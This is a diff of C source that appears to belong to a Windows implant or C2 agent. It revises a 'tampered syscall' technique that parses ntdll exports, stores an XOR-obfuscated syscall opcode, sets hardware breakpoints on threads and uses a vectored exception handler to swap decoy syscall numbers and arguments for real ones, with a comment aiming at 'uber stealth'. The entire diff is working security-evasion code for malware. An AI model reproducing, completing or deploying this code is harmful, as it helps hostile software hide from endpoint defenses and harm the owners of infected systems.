@@ -14,7 +14,6 @@ pBENIGN_ENTRY_LIST g_BenignSyscallList = NULL;
 TAMPERED_SYSCALL g_TamperedSyscall = { 0 };
 CRITICAL_SECTION g_CriticalSection = { 0 };
 PVOID g_VehHandler = NULL;
-LONG ExceptionHandlerCallbackRoutine(IN PEXCEPTION_POINTERS pExceptionInfo);
 volatile unsigned short g_SYSCALL_OPCODE = 0x405D; // 0x050F ^ 0x2325
 #if defined(_WIN64)
 #define SEARCH_BYTES 0x8b4c
@@ -49,7 +48,7 @@ BOOL PopulateSyscallLists() {
 
         LPSTR pFunctionName = (LPSTR)((LPBYTE)agent->apis->hNtdll + pdwFunctionNameArray[i]);
 
-        if (*(unsigned short*)pFunctionName == 'tN' && g_SyscallList->u32Count <= MAX_ENTRIES) { // we've found a syscall name.
+        if (*(unsigned short*)pFunctionName == 'wZ' && g_SyscallList->u32Count <= MAX_ENTRIES) { // we've found a syscall name.
             ULONG_PTR uAddress = (ULONG_PTR)((LPBYTE)agent->apis->hNtdll + pdwFunctionAddressArray[pwFunctionOrdinalArray[i]]); // obtain address pointer
             DWORD wBytes = *(DWORD*)uAddress; //obtain the first 2 bytes of the func.
             DWORD64 dw64Hash = Rotr64HashA(pFunctionName); //obtain the function hash
@@ -207,11 +206,12 @@ BOOL InstallHardwareBreakpointHook(_In_ DWORD dwThreadID, _In_ ULONG_PTR uTarget
     BOOL bResult = FALSE;
     NTSTATUS NtStatus = -1;
     CLIENT_ID ClientID = {0};
-    ClientID.UniqueProcess = (HANDLE) NtCurrentProcess();
     ClientID.UniqueThread = (HANDLE)dwThreadID;
+    OBJECT_ATTRIBUTES objAttr = {0};
+    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
 
     //TODO : use indirect syscalls and native functions for this for uber stealth.
-    if((NtStatus = agent->apis->pNtOpenThread(&hThread, THREAD_ALL_ACCESS, NULL, &ClientID)) != 0x00) {
+    if((NtStatus = agent->apis->pNtOpenThread(&hThread, THREAD_ALL_ACCESS, &objAttr, &ClientID)) != 0x00) {
         goto _END_OF_FUNC;
     }
 
@@ -237,9 +237,9 @@ BOOL InstallHardwareBreakpointHook(_In_ DWORD dwThreadID, _In_ ULONG_PTR uTarget
     return bResult;
 }
 
-BOOL InitializeTamperedSyscall(_In_ ULONG_PTR uCalledSyscallAddress, _In_ DWORD64 FunctionHash, _In_ INT Nargs,  _In_ ULONG_PTR uParam1, _In_ ULONG_PTR uParam2, _In_ ULONG_PTR uParam3, _In_ ULONG_PTR uParam4, ULONG_PTR uParam5, ULONG_PTR uParam6, ULONG_PTR uParam7, ULONG_PTR uParam8, ULONG_PTR uParam9, ULONG_PTR uParamA, ULONG_PTR uParamB) {
+BOOL InitializeTamperedSyscall(_In_ ULONG_PTR uCalledSyscallAddress, _In_ DWORD SSN, _In_ INT Nargs,  _In_ ULONG_PTR uParam1, _In_ ULONG_PTR uParam2, _In_ ULONG_PTR uParam3, _In_ ULONG_PTR uParam4, ULONG_PTR uParam5, ULONG_PTR uParam6, ULONG_PTR uParam7, ULONG_PTR uParam8, ULONG_PTR uParam9, ULONG_PTR uParamA, ULONG_PTR uParamB) {
 
-   if(!uCalledSyscallAddress || !FunctionHash)
+   if(!uCalledSyscallAddress || !SSN)
        return FALSE;
 
     PVOID pDecoySyscallInstructionAdd = NULL;
@@ -256,8 +256,7 @@ BOOL InitializeTamperedSyscall(_In_ ULONG_PTR uCalledSyscallAddress, _In_ DWORD6
     if(!pDecoySyscallInstructionAdd)
         return FALSE;
 
-    if(!(dwRealSyscallNumber = FetchSSNFromSyscallEntries(FunctionHash)))
-        return FALSE;
+    dwRealSyscallNumber = SSN;
 
     PopulateTamperedSyscall(uParam1, uParam2, uParam3, uParam4, uParam5, uParam6, uParam7, uParam8, uParam9, uParamA, uParamB, dwRealSyscallNumber, Nargs);
 
@@ -282,10 +281,11 @@ LONG ExceptionHandlerCallbackRoutine(IN PEXCEPTION_POINTERS pExceptionInfo) {
     //Replace Decoy SSN
     pExceptionInfo->ContextRecord->Rax = (DWORD64)g_TamperedSyscall.dwSyscallNumber;
     // replace decoy parms
-    pExceptionInfo->ContextRecord->R10 = (DWORD64)g_TamperedSyscall.uParam1;
-    pExceptionInfo->ContextRecord->Rdx = (DWORD64)g_TamperedSyscall.uParam2;
-    pExceptionInfo->ContextRecord->R8 = (DWORD64)g_TamperedSyscall.uParam3;
-    pExceptionInfo->ContextRecord->R9 = (DWORD64)g_TamperedSyscall.uParam4;
+    //pExceptionInfo->ContextRecord->Rcx = g_TamperedSyscall.uParam1;
+    pExceptionInfo->ContextRecord->R10 = g_TamperedSyscall.uParam1;
+    pExceptionInfo->ContextRecord->Rdx = g_TamperedSyscall.uParam2;
+    pExceptionInfo->ContextRecord->R8 = g_TamperedSyscall.uParam3;
+    pExceptionInfo->ContextRecord->R9 = g_TamperedSyscall.uParam4;
 
     //stack content BEFORE the swap
 
